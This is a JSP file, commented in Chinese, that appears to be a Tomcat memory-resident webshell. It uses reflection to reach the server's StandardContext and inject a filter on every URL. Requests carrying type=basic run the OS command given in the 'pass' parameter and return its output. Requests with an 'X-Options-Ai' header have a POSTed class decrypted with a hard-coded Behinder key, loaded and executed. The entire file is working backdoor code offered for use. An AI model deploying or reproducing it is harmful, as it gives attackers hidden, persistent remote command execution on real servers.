<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Modifier" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.UUID" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    try{

        String filterName = "dynamic1";
        String urlPattern = "/*";
        final String password = "pass";

        // 获取 standardContext
        final ServletContext servletContext = request.getSession().getServletContext();

        Field field = servletContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);

        field = applicationContext.getClass().getDeclaredField("context");
        field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
        StandardContext standardContext = (StandardContext) field.get(applicationContext);

        field = standardContext.getClass().getDeclaredField("filterConfigs");
        field.setAccessible(true);
        HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

        if(map.get(filterName) == null){
            System.out.println("[+] Add Dynamic Filter");

            //生成 FilterDef
            //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
            Class filterDefClass = null;
            try{
                filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
            }catch(ClassNotFoundException e){
                filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            }

            Object filterDef = filterDefClass.newInstance();
            filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});
            Filter filter = new Filter() {
                @Override
                public void init(FilterConfig filterConfig) throws ServletException {

                }

                @Override
                public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                    System.out.println("[+] Dynamic Filter says hello");

                    String type = servletRequest.getParameter("type");
                    if(type != null && type.equals("basic")){
                        String cmd = servletRequest.getParameter(password);
                        if(cmd != null && !cmd.isEmpty()){
                            String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                            servletResponse.getWriter().println(result);
                        }
                    }else if(((HttpServletRequest)servletRequest).getHeader("X-Options-Ai") != null){
                        try{
                            if (((HttpServletRequest)servletRequest).getMethod().equals("POST")) {
                                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                                ((HttpServletRequest)servletRequest).getSession().setAttribute("u",k);
                                Cipher cipher = Cipher.getInstance("AES");
                                cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
                                byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
                                Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                                Object evilObject = evilClass.newInstance();
                                Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
                                targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
                            }
                        }catch(Exception e){
                            e.printStackTrace();
                        }
                    }else{
                        filterChain.doFilter(servletRequest, servletResponse);
                    }
                }

                @Override
                public void destroy() {

                }

                class U extends ClassLoader{
                    U(ClassLoader c){super(c);}

                    public Class g(byte []b){return super.defineClass(b,0,b.length);}
                }
            };


            filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
            filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
            standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});

            //设置 FilterMap
            //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
            Class filterMapClass = null;
            try{
                filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
            }catch (ClassNotFoundException e){
                filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            }

            Object filterMap = filterMapClass.newInstance();
            filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
            filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
            filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
            //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
            standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

            //设置 FilterConfig
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
            map.put(filterName, filterConfig);
        }
    }catch(Exception e){
        e.printStackTrace();
    }
%>
